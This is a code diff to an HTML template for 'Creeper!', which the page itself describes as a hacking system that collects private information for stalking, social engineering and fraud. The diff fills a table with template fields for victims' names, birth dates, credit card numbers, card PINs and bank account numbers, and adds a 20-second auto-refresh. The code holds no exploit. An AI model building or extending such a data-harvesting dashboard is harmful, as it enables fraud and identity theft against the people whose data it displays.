@@ -12,7 +12,7 @@
     <title>Creeper!</title>
 
     <!-- Bootstrap core CSS -->
-    <link href="../css/bootstrap.min.css" rel="stylesheet">
+    <link href="../static/bootstrap.min.css" rel="stylesheet">
   </head>
 
   <body>
@@ -63,47 +63,52 @@
         <h1 style="text-align: center">Creeper!</h1>
         <h5 style="text-align: center">Creeper! is a new and innovative open-source hacking system that gathers every forms of private information for many purposes, including but not limited to: creeping, social engineering, and fraud.</h5>
 	<p>
-          <a class="btn btn-lg btn-primary" href="../../components/#navbar" role="button">View navbar docs &raquo;</a>
+          <!--<a class="btn btn-lg btn-primary" href="../../components/#navbar" role="button">View navbar docs &raquo;</a> -->
         </p>
 	<hr></hr>
 	<h2>Info</h2>
+<script>
+setTimeout(function(){
+   window.location.reload(1);
+}, 20000);
+</script>
 	<table class="table">
 	  <tbody>
 	    <tr>
 	      <td class="col-md-3"><b>First Name</b></td>
-	      <td>blah2</td>
+	      <td>{{firstname}}</td>
 	    </tr>
 	    <tr>
 	      <td class="col-md-3"><b>Last Name</b></td>
-	      <td>blah2</td>
+	      <td>{{lastname}}</td>
 	    </tr>
 	    <tr>
 	      <td class="col-md-3"><b>Email</b></td>
-	      <td>blah2</td>
+	      <td>{{email}}</td>
 	    </tr>
 	    <tr>
 	      <td class="col-md-3"><b>Date of Birth</b></td>
-	      <td>blah2</td>
+	      <td>{{dob}}</td>
 	    </tr>
 	    <tr>
 	      <td class="col-md-3"><b>Phone Number</b></td>
-	      <td>blah2</td>
+	      <td>{{phonenumber}}</td>
 	    </tr>
 	    <tr>
 	      <td class="col-md-3"><b>Credit Card Number</b></td>
-	      <td>blah2</td>
+	      <td>{{creditcardnumber}}</td>
 	    </tr>
 	    <tr>
 	      <td class="col-md-3"><b>Credit Card PIN</b></td>
-	      <td>blah2</td>
+	      <td>{{creditcardpin}}</td>
 	    </tr>
 	    <tr>
 	      <td class="col-md-3"><b>Bank Account Number</b></td>
-	      <td>blah2</td>
+	      <td>{{bankaccountnumber}}</td>
 	    </tr>
 	    <tr>
 	      <td class="col-md-3"><b>Address</b></td>
-	      <td>blah2</td>
+	      <td>{{address}}</td>
 	    </tr>
 	  </tbody>
 	</table>
@@ -125,7 +130,7 @@
     ================================================== -->
     <!-- Placed at the end of the document so the pages load faster -->
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
-    <script src="bootstrap.min.js"></script>
+    <script src="../static/bootstrap.min.js"></script>
     <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
   </body>
 </html>
